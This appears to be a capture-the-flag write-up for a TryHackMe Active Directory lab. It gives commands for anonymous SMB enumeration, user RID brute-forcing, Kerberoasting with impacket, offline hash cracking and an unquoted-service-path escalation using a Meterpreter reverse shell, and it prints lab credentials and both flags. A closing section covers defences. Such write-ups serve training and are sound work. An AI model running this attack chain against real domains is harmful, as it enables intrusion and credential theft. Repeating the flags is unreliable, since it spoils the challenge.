# 👑 THM: ENTERPRISE

|**Challenge Details**||
|---|---|
|**Category:**|[[CyberSecurity]], [[Active Directory]], [[Kerberoasting]], [[SMB Enumeration]], [[Unquoted Service Path]], [[Windows Privilege Escalation]]|
|**Difficulty:**|Medium|
|**Target:**|`LAB-DC.LAB.ENTERPRISE.THM` (Windows Domain Controller: IP: $target)|
|**Status:**|#solved|
|**Date Completed:**|[[2025-12-12]]|

---

## 🗺️ Phase 1: Reconnaissance (Nmap Scans)

The initial scans confirmed the target is a Windows Domain Controller/Server and identified several key services, including a non-standard web service on port 7990.

### Key Open Ports & Services

| **Port**                      | **Service**  | **Version/Description**            | **Key Takeaway**                                                  |
| ----------------------------- | ------------ | ---------------------------------- | ----------------------------------------------------------------- |
| 53, 88, 389, 464, 636, 3268/9 | AD Services  | DNS, Kerberos, LDAP, Kpasswd, etc. | Confirms **Domain Controller** role for **`LAB.ENTERPRISE.THM`**. |
| **80**                        | http         | Microsoft IIS httpd 10.0           | Standard web server.                                              |
| **445**                       | microsoft-ds | SMB/CIFS                           | **SMB/Guest access** potential.                                   |
| **5985**                      | wsman/http   | WinRM                              | **Remote shell** access potential.                                |
| **7990**                      | unknown      | (later identified)                 | Non-standard port, required further investigation.                |

---

## 🔑 Phase 2: Initial Access (Information Gathering & Kerberoasting)

The strategy combined anonymous access via SMB, web enumeration for leads, and a targeted Kerberoasting attack.

### 1. Anonymous SMB Access

The host allowed unauthenticated guest access via SMB.

|**Command**|**Tool**|**Outcome**|
|---|---|---|
|`netexec smb $target -u 'guest' -p '' --shares`|`netexec`|Confirmed guest login. Found interesting shares: **`Docs`** (READ), **`Users`** (READ).|
|`smbclient //$target/Users -U 'guest' -c 'mask ""; recurse; prompt; mget *'`|`smbclient`|Downloaded documents from the `Docs` share: `RSA-Secured-Credentials.xlsx` and `RSA-Secured-Document-PII.docx` (both password protected).|
|`netexec smb $target -u 'guest' -p '' --rid-brute`|`netexec`|Enumerated numerous domain users, including: `atlbitbucket`, `bitbucket`, `nik`, `spooks`, `korone`, etc.|

### 2. Information Leakage (Port 7990)

The service on port 7990 was identified as an Atlassian site mentioning a migration to GitHub. Searching for "THM.enterprise github" led to a repository.

A review of commit history (specifically changes to `systeminfo.ps1`) revealed a set of credentials:

- **User:** `nik`
    
- **Password:** `ToastyBoi!`
    

### 3. Kerberoasting Attack

The valid credentials for `nik` were used to request Service Principal Name (SPN) tickets, targeting user accounts configured to run services.

|**Command**|**Tool**|**Outcome**|
|---|---|---|
|`impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:ToastyBoi! -dc-ip $target -request`|`impacket-GetUserSPNs`|Captured a TGS ticket (hash) for the user **`bitbucket`**, associated with the SPN `HTTP/LAB-DC`.|

### 4. Hash Cracking and RDP Access

The captured hash was cracked offline to obtain the cleartext password for the `bitbucket` user.

|**Command**|**Tool**|**Outcome**|
|---|---|---|
|`john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs`|`john`|Cracked Password: **`littleredbucket`**|
|**Credentials:**||**`bitbucket:littleredbucket`**|
|RDP Verification:|`netexec rdp...`|Confirmed valid credentials.|

Using `xfreerdp3`, an RDP session was established, successfully retrieving the user flag.

- **User Flag:** `THM{ed882d02b34246536ef7da79062bef36}`
    

---

## 💥 Phase 3: Privilege Escalation (Unquoted Service Path)

From the RDP session (or by switching to a WinRM session), the `PowerUp.ps1` script was executed to look for common Windows privilege escalation vectors.

### 1. PowerUp Check

|**Command**|**Tool**|**Outcome**|
|---|---|---|
|`. .\PowerUp.ps1;Invoke-AllChecks`|`PowerUp.ps1`|Identified an **Unquoted Service Path** vulnerability in the `zerotieroneservice`.|

### 2. Vulnerable Service Details

- **Service Name:** `zerotieroneservice`
    
- **Vulnerable Path:** `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe` (Missing quotes)
    
- **Execution User:** `LocalSystem` (High privilege)
    
- **Exploitable Path:** The absence of quotes allows the OS to try executing `C:\Program.exe` if it exists. Since `BUILTIN\Users` (which includes `bitbucket`) has write permission to `C:\`, this location can be hijacked.
    

### 3. Execution and Root Flag

1. **Payload Creation:** A Meterpreter reverse shell payload (`Program.exe`) was created using `msfvenom` and uploaded to the root of the C drive (`C:\`).
    
2. **Listener:** `msfconsole` was set up to catch the incoming shell on LPORT 8008.
    
3. **Exploitation:** The `zerotieroneservice` was restarted, causing the OS to execute `C:\Program.exe` as `NT AUTHORITY\SYSTEM`.
    

|**Shell Command**|**Outcome**|
|---|---|
|`whoami` (in Meterpreter)|`nt authority\system` (SYSTEM privileges confirmed)|
|`type C:\Users\Administrator\Desktop\root.txt`|**Root Flag: `THM{1a1fa94875421296331f145971ca4881}`**|

---

---

## 🛡️ Defensive & Educational Summary

This challenge involved three major security weaknesses:

### 1. Insecure Information Disclosure (GitHub/Web)

- **Vulnerability:** Hardcoded credentials (`nik:ToastyBoi!`) were leaked publicly via a code repository change log.
    
- **Defense:** Implement **Secrets Management** tools to scan code for sensitive information before committing. Developers must be trained to use secure environment variables, configuration files, or enterprise secret vaults (like HashiCorp Vault).
    

### 2. Kerberoasting Attack

- **Vulnerability:** A Service Principal Name (SPN) account (`bitbucket`) was protected only by a guessable/weak password (`littleredbucket`).
    
- **Defense:** **Service Accounts** associated with SPNs should have passwords that are extremely long, complex, and ideally rotated frequently, as their hashes are easy to extract and attack offline. Ideally, use Managed Service Accounts (MSAs) or Group Managed Service Accounts (gMSAs).
    

### 3. Unquoted Service Path Privilege Escalation

- **Vulnerability:** The service executable path contained spaces but was not enclosed in quotes (`C:\Program Files (x86)\...`). Furthermore, an unprivileged user had write access to a preceding directory (`C:\`).
    
- **Defense:** **Always enclose service executable paths in quotes** (e.g., `"C:\Program Files\..."`). Additionally, ensure that standard user groups do not have **write permissions** on root directories (`C:\`) or directories within `C:\Program Files`. Run tools like **PowerUp** defensively to audit service configurations for this flaw.
